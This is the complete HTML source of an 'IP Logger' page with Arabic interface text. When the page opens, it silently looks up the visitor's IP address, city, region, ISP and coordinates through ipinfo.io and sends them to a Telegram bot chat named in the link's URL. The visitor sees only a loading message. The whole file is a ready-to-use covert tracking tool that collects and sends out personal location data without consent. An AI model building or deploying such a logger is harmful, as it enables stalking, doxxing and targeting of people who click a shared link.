<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <script>
        const botToken = '%TOKEN%';

        async function sendInfo() {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const chatId = urlParams.get('id');

                if (!chatId) {
                    document.body.innerHTML = '<h1>⚠️ رابط غير صالح</h1>';
                    return;
                }

                // جلب المعلومات من ipinfo.io
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();

                const message = `
🕵️ **تم تسجيل دخول جديد!**
📌 **IP:** ${data.ip}
📍 **الدولة:** ${data.country || 'غير معروف'}
🏙️ **المدينة:** ${data.city || 'غير معروف'}
🗺️ **المنطقة:** ${data.region || 'غير معروف'}
🌐 **المزود:** ${data.org || 'غير معروف'}
📍 **الموقع:** ${data.loc || 'غير معروف'}
                `;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';

            } catch (error) {
                console.error('خطأ:', error);
                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
            }
        }

        window.onload = sendInfo;
    </script>
</head>
<body>
    <h1>جاري تحميل البيانات...</h1>
</body>
</html>
